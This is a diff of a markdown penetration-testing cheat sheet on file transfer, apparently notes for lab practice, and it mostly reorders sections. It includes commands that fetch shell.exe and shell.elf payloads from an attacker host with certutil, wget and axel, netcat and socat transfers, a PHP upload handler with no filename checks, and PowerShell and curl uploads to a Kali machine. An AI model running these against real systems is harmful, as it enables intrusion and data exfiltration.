@@ -1,51 +1,6 @@
 # File Transfer
 
-## Upload files
-
-### HTTP Server
-
-Kali Machine
-
-``` php
-<?php
-$uploaddir = '/var/www/uploads/';
-
-$uploadfile= $uploaddir . $_FILES['file']['name'];
-
-move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
-?>
-```
-
-
-Client
-
-PowerShell
-
-``` bash
-powershell.exe (New-Object System.Net.WebClient).UploadFile('http://192.168.11.140/upload.php', 'test.txt')
-```
-
-curl
-
-``` bash
-curl -F "file=@nc.cmd" http://192.168.11.140/upload.php
-```
-
-### TFTP
-
-``` bash
-sudo atftpd --daemon --port 69 /tftp
-```
-
-``` bash
-getent services tftp
-```
-
-``` bash
-tftp -i 192.168.11.140 put test.txt
-```
-
-## HTTP Server
+## wget, curl, axel, certutil
 
 Server
 
@@ -95,6 +50,40 @@ Client
 	``` bash
 	axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
 	```
+
+=== "certutil"
+
+	``` bash
+	certutil.exe -urlcache -f http://<url>/shell.exe C:\\inetpub\\wwwroot\\shell.exe
+	```
+
+## Socat
+
+Kali machine
+
+``` bash
+sudo socat TCP4-LISTEN:443,fork file:shell.exe
+```
+
+Windows machine
+
+``` bash
+socat TCP4:192.168.11.130:443 file:shell.exe,create
+```
+
+## Netcat
+
+Kali machine
+
+``` bash
+nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe
+```
+
+Windows machine
+
+``` bash
+nc -nv 192.168.11.130 4444 > wget.exe
+```
 
 ## SMB Protocol
 
@@ -226,12 +215,6 @@ upx -9 nc.exe
 exe2hex -x nc.exe -p nc.cmd
 ```
 
-## Certutil
-
-``` bash
-certutil.exe -urlcache -f http://<url>/shell.exe C:\\inetpub\\wwwroot\\shell.exe
-```
-
 ## FTP Server
 
 Install
@@ -247,34 +230,6 @@ Anonymous access
 sudo nano /etc/vsftpd.conf
 
 => anonymous_enable=YES
-```
-
-## Netcat
-
-Kali machine
-
-``` bash
-nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe
-```
-
-Windows machine
-
-``` bash
-nc -nv 192.168.11.130 4444 > wget.exe
-```
-
-## Socat
-
-Kali machine
-
-``` bash
-sudo socat TCP4-LISTEN:443,fork file:shell.exe
-```
-
-Windows machine
-
-``` bash
-socat TCP4:192.168.11.130:443 file:shell.exe,create
 ```
 
 ## Pure-FTPd
@@ -306,4 +261,48 @@ quit
 
 ``` bash
 ftp -v -n -s:ftp.txt
+```
+
+## Upload files
+
+### HTTP Server
+
+Kali Machine
+
+``` php
+<?php
+$uploaddir = '/var/www/uploads/';
+
+$uploadfile= $uploaddir . $_FILES['file']['name'];
+
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+```
+
+Client
+
+PowerShell
+
+``` bash
+powershell.exe (New-Object System.Net.WebClient).UploadFile('http://192.168.11.140/upload.php', 'test.txt')
+```
+
+curl
+
+``` bash
+curl -F "file=@nc.cmd" http://192.168.11.140/upload.php
+```
+
+### TFTP
+
+``` bash
+sudo atftpd --daemon --port 69 /tftp
+```
+
+``` bash
+getent services tftp
+```
+
+``` bash
+tftp -i 192.168.11.140 put test.txt
 ```
